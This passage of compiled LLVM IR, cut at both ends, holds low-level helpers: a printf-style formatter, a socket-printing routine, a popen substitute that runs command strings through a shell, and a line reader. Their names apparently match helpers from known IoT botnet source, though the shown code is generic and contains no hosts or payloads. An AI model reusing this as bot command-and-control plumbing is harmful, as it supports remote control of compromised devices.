  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** noundef %266, i8* noundef %267, i32 noundef %268, i32 noundef %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** noundef %276, i32 noundef %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !13

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @prints(i8** noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !14

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %51, i32 noundef %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !15

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** noundef %65, i32 noundef %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !16

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %79, i32 noundef %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !17

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @printi(i8** noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** noundef %28, i8* noundef %29, i32 noundef %30, i32 noundef %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !18

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** noundef %85, i32 noundef 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** noundef %96, i8* noundef %97, i32 noundef %98, i32 noundef %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @printchar(i8** noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 noundef 1, i8* noundef %16, i64 noundef 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @szprintf(i8* noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** noundef %3, i8* noundef %8, %struct.__va_list_tag* noundef %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sockprintf(i32 noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 noundef 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** noundef %5, i8* noundef %14, %struct.__va_list_tag* noundef %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* noundef %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* noundef %25) #11
  %27 = call i64 @send(i32 noundef %23, i8* noundef %24, i64 noundef %26, i32 noundef 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* noundef %29) #12
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @free(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpopen(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* noundef %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 noundef %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 noundef %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 noundef %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 noundef %74, i32 noundef 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 noundef %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 noundef %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 noundef %89, i32 noundef 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 noundef %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 noundef %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i64 0, i64 0), i8* noundef %99, i8* noundef null) #12
  call void @_exit(i32 noundef 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 noundef %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 noundef %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32* noundef) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @dup2(i32 noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @execl(i8* noundef, i8* noundef, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32 noundef) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 noundef %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* noundef %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* noundef %6, i32 noundef 1) #12
  %26 = call i32 @sigprocmask(i32 noundef 0, %struct.__sigset_t* noundef %6, %struct.__sigset_t* noundef %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 noundef %32, i32* noundef %7, i32 noundef 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !19

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 noundef 2, %struct.__sigset_t* noundef %5, %struct.__sigset_t* noundef null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t* noundef) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef) #4

declare i32 @waitpid(i32 noundef, i32* noundef, i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
